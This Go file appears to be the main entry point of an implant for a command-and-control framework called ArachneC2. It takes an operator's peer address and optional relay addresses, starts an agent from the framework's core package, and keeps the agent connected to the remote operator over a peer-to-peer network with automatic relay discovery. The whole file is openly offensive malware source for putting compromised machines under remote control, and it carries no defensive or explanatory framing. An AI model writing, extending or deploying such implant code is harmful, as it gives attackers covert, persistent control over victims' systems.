package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/portbuster1337/ArachneC2/implant/core"
)

func main() {
	peerAddr := flag.String("peer", "", "operator multiaddress (e.g. /ip4/1.2.3.4/tcp/35543/p2p/12D3...)")
	var relayAddrs multiFlag
	flag.Var(&relayAddrs, "relay", "relay multiaddress (optional, auto-discovers via DHT by default)")
	flag.Parse()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	cfg := core.DefaultAgentConfig()
	if *peerAddr != "" {
		cfg.OperatorAddr = *peerAddr
	}
	cfg.RelayAddrs = relayAddrs

	agent, err := core.NewAgent(ctx, cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
	defer agent.Close()

	if err := agent.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}

	log.Printf("[implant] running (Ctrl+C to stop)")
	select {}
}

type multiFlag []string

func (m *multiFlag) String() string {
	if len(*m) == 0 {
		return ""
	}
	return (*m)[0]
}

func (m *multiFlag) Set(s string) error {
	*m = append(*m, s)
	return nil
}
